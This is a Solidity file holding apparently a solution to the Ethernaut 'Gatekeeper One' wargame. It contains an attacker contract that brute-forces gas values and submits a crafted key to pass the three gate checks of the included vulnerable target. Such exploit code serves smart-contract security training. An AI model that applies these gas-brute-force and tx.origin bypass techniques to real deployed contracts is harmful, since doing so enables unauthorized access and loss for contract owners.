// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract EthernautGatekeeperOneAttack {
    EthernautGatekeeperOne target;

    constructor(address _addr) {
        target = EthernautGatekeeperOne(_addr);
    }

    function test(bytes8 _gateKey) public {
        console.log(uint64(_gateKey));
    }

    function attack(bytes8 key) public {
        for (uint i = 0; i < 8191; i++) {
            uint price = 80000 + i;
            try target.enter{gas: price}(key) {
                console.log("gatcha", price);
                break;
            } catch {}
        }
    }
}

contract EthernautGatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
